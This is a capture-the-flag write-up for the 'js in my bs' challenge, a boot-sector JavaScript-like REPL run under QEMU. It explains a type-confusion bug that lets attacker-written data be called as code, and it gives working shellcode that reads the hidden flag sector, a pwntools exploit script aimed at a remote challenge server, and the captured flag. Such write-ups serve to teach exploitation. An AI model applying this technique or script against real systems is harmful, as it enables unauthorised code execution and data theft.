# js in my bs

## Challenge

The challenge provides a QEMU setup that uses bootjs.bin as the disk image.
This image contains a miniature JavaScript-like read-eval-print loop in the MBR section, which talks to the machine's serial IO.

The flag is included in the disk image that is loaded on the remote, however, it is located at offset 0x200, which is immediately after the end of the sector loaded by the bios.

We can set variables using the `=` operator, which accepts a math expression as the value, but can only parse single digit tokens.

For example, to set a new variable `a` to 1, we can use:

```js
> a=1
```

For values larger than a single digit, we can use expressions such as:

```js
> b=8+8
```

A function `l` is preset to allow us to read variables:

```js
> l(a)
0001
```

## Solution

Functions and variables are stored as 3-byte elements in a contiguous array in a data section loaded at 0x7cda.

```
+------+---------+---------+
| name | value_l | value_h |
+------+---------+---------+
```

The program does not store whether data is a function or variable, thus the program is vulnerable to type-confusion between these data types.

For example, we can treat `l` as a variable and print its value as a number:

```js
> l(a)
7C7A
```

We can see that the value of `l` is a 16-bit address, which points to the function code in the MBR section.

Likewise, we can treat one of our variables as a function, calling the address stored in the variable.

As there is also no distinction between data and program memory, we can write shellcode into the variable data and call it as a function.

As the first byte of each 3-byte unit will be treated as the variable name, these bytes must be unique.
They must also be greater than the 0x39 (the ASCII value of '9') to avoid being treated as a number.
To satisfy these requirements, we insert NOP instructions to pad the 2-byte MOV instructions in our shellcode.

We can then write our shellcode into memory by using the first byte of a 3-byte unit as the name, and the other 2 bytes as a little-endian 16-bit number.

We also need to set a variable to store the address of the start of our shellcode, so we can call it and execute our shellcode.

With our shellcode, we use an interrupt to read the next sector from the disk, which contains the flag, then we output the contents of this sector to serial out.

## Exploit

### shellcode.s

```asm
[org 0x7c00]
[bits 16]

start:
    mov ah, 0x2                ; read sectors from drive
    nop
    mov al, 1                  ; sectors to read
    nop
    mov ch, 0                  ; cylinder idx
    nop
    mov dh, 0                  ; head idx
    nop
    mov cl, 2                  ; sector idx
    nop
    mov dl, 0x80               ; disk idx
    nop
    mov bx, 0x7e00             ; target pointer
    int 0x13                   ; interrupt
    mov dx, 0x3f8              ; serial out
    mov si, bx                 ; source buffer (start of flag)

loop:
    lodsb                      ; load byte from si into al, advance si
    out dx, al                 ; send al to serial out
    jmp loop                   ; repeat
```

### exploit.py

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = args.HOST or '54.93.211.13'
port = int(args.PORT or 10000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return process(['debug.sh'] + argv, *a, **kw)
    else:
        return process(['run.sh'] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    hash_challenge = io.recvline().split()
    if hash_challenge[0] == b'hashcash' and hash_challenge[1] == b'-mb28':
        response = subprocess.run([
            'hashcash',
            '-mb28',
            hash_challenge[2].decode(),
        ], capture_output=True).stdout
        io.send(response)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

shellcode = open('shellcode.bin', 'rb').read()

def set_var(name, value):
    print(name, hex(value))
    io.sendafter(b'> ', name + b'=0' + b'+9' * (value // 9) + b'+' + str(value % 9).encode() + b'\n')
    io.recvline()

def write_3(x):
    x = x.ljust(3, b'\x00')
    set_var(x[0:1], u16(x[1:3]))

io = start()

shellcode_addr = 0x7ce0
set_var(b'a', shellcode_addr)

for i in range(0, len(shellcode), 3):
    write_3(shellcode[i:i+3])

io.sendafter(b'> ', b'a(0)')

io.recvuntil(b')')
print(io.recvuntil(b'}'))
```

## Flag

```
kalmar{this_would_be_a_nice_addon_to_all_efi_shells_right?}
```
